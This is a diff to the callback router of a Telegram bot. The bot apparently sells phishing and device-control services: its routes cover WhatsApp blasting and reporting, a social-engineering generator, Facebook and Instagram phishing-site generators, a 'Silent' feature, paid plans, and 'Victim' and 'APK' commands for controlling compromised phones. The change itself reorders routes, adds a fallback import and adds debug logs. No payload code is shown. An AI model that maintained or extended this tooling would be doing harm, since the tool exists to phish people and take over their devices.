@@ -1,6 +1,6 @@
 # bot_handlers/callbacks/router.py
 # ============================================================
-# Router v5 — مع WhatsApp Blast + WhatsApp Report
+# Router v5.1 — مع WhatsApp Blast + WhatsApp Report (FIXED)
 # ============================================================
 
 from config import bot
@@ -24,12 +24,25 @@ from . import admin as admin_cb
 from . import misc as misc_cb
 from . import social_engineering as se_cb
 from . import points as points_cb
-from . import wa_report as wa_report_cb     # ← جديد
+
+# ═══ WhatsApp Report — مع try/except عشان نعرف لو فيه مشكلة ═══
+try:
+    from . import wa_report as wa_report_cb
+    WA_REPORT_AVAILABLE = True
+    logger.info("[router] WhatsApp Report handler loaded")
+except Exception as e:
+    WA_REPORT_AVAILABLE = False
+    logger.exception(f"[router] WhatsApp Report NOT available: {e}")
+
+    def _wa_report_fallback(call, chat_id, user_id, data):
+        bot.answer_callback_query(call.id, "❌ WhatsApp Report غير متاح", show_alert=True)
+
+    class _FakeWA:
+        handle = staticmethod(_wa_report_fallback)
+    wa_report_cb = _FakeWA()
 
 
-# ============================================================
-# WhatsApp Blast Handler
-# ============================================================
+# ═══ WhatsApp Blast ═══
 try:
     from admin_tools.whatsapp_blast.bot_handlers_real import handle_wb_callback
     WB_AVAILABLE = True
@@ -43,13 +56,12 @@ except Exception as e:
 
 
 # ============================================================
-# ROUTES
+# ROUTES — الترتيب مهم جداً!
 # ============================================================
 ROUTES = [
-    # ═══ 0. WhatsApp Blast ═══
-    (lambda d: d == "admin_wb_menu" or d.startswith("wbr_"), handle_wb_callback),
-
-    # ═══ 0.5. WhatsApp Report ═══ (جديد)
+    # ═══════════════════════════════════════════════════════
+    # ⚡ [0] WhatsApp Report — لازم يبقى الأول عشان مايتعارضش
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "wa_report_start"
               or d == "wa_report_help"
               or d == "wa_report_templates"
@@ -59,7 +71,14 @@ ROUTES = [
               or d.startswith("wa_report_finish_"),
      wa_report_cb.handle),
 
-    # ═══ 1. Points / Settings ═══
+    # ═══════════════════════════════════════════════════════
+    # [1] WhatsApp Blast
+    # ═══════════════════════════════════════════════════════
+    (lambda d: d == "admin_wb_menu" or d.startswith("wbr_"), handle_wb_callback),
+
+    # ═══════════════════════════════════════════════════════
+    # [2] Points / Settings
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "settings_menu"
               or d == "points_menu"
               or d.startswith("my_referral")
@@ -68,41 +87,65 @@ ROUTES = [
               or d == "my_referrals"
               or d.startswith("tool_confirm_"), points_cb.handle),
 
-    # ═══ 2. Social Engineering ═══
+    # ═══════════════════════════════════════════════════════
+    # [3] Social Engineering
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "gen_se" or d.startswith("se_"), se_cb.handle),
 
-    # ═══ 3. Misc ═══
+    # ═══════════════════════════════════════════════════════
+    # [4] Misc
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "noop", misc_cb.handle),
     (lambda d: d == "back_to_main", misc_cb.handle),
 
-    # ═══ 4. Help ═══
+    # ═══════════════════════════════════════════════════════
+    # [5] Help
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "help_guide" or d.startswith("help_page_"), help_cb.handle),
 
-    # ═══ 5. Search ═══
+    # ═══════════════════════════════════════════════════════
+    # [6] Search
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "search_menu" or d.startswith("search_"), search_cb.handle),
 
-    # ═══ 6. Facebook ═══
+    # ═══════════════════════════════════════════════════════
+    # [7] Facebook
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "gen_fb" or d.startswith("fb_site_") or d.startswith("fb_stats_"), fb_cb.handle),
 
-    # ═══ 7. Instagram ═══
+    # ═══════════════════════════════════════════════════════
+    # [8] Instagram
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "gen_ig" or d.startswith("ig_site_") or d.startswith("ig_stats_"), ig_cb.handle),
 
-    # ═══ 8. Silent ═══
+    # ═══════════════════════════════════════════════════════
+    # [9] Silent
+    # ═══════════════════════════════════════════════════════
     (lambda d: d in ("gen_silent", "silent_new", "silent_stats", "silent_recent"), silent_cb.handle),
 
-    # ═══ 9. Dashboard ═══
+    # ═══════════════════════════════════════════════════════
+    # [10] Dashboard
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "open_dashboard", dash_cb.handle),
 
-    # ═══ 10. Payment / My Account ═══
+    # ═══════════════════════════════════════════════════════
+    # [11] Payment
+    # ═══════════════════════════════════════════════════════
     (lambda d: d in ("payment_menu", "show_plans", "my_account") or d.startswith("buy_plan_"), payment_cb.handle),
 
-    # ═══ 11. Updates ═══
+    # ═══════════════════════════════════════════════════════
+    # [12] Updates
+    # ═══════════════════════════════════════════════════════
     (lambda d: d.startswith("upd_"), upd_cb.handle),
 
-    # ═══ 12. Admin ═══
+    # ═══════════════════════════════════════════════════════
+    # [13] Admin
+    # ═══════════════════════════════════════════════════════
     (lambda d: d == "admin_panel" or d.startswith("admin_"), admin_cb.handle),
 
-    # ═══ 13-14. Victim / APK Commands ═══
+    # ═══════════════════════════════════════════════════════
+    # [14] Victim Commands
+    # ═══════════════════════════════════════════════════════
     (lambda d: d.startswith("vcmd_"), vcmd_cb.handle),
     (lambda d: d.startswith("apk_cmd_"), apk_cmd_cb.handle),
     (lambda d: d.startswith("v_"), victims_cb.handle),
@@ -110,7 +153,7 @@ ROUTES = [
 
 
 # ============================================================
-# Callback Handler الرئيسي
+# Callback Handler الرئيسي — مع Debug Logs
 # ============================================================
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
@@ -118,19 +161,24 @@ def callback_handler(call):
     user_id = call.from_user.id
     data = call.data
 
+    # 🔍 Debug Log — عشان نعرف بيوصل إيه
+    logger.info(f"[CALLBACK] user={user_id} | data='{data}'")
+
     try:
-        for matcher, handler in ROUTES:
+        for idx, (matcher, handler) in enumerate(ROUTES):
             try:
                 if matcher(data):
+                    logger.info(f"[CALLBACK] matched route #{idx} for '{data}'")
                     handler(call, chat_id, user_id, data)
                     return
             except Exception as e:
-                logger.exception(f"route match error for {data}: {e}")
+                logger.exception(f"[CALLBACK] route #{idx} error for '{data}': {e}")
                 continue
 
-        logger.warning(f"Unhandled callback: {data}")
+        # مفيش route مطابق
+        logger.warning(f"[CALLBACK] ⚠️ Unhandled callback: '{data}'")
         bot.answer_callback_query(call.id)
 
     except Exception as e:
-        logger.exception(f"callback handler error: {e}")
+        logger.exception(f"[CALLBACK] handler error: {e}")
         metrics.inc_counter("bot_errors", tags={"type": "callback"})
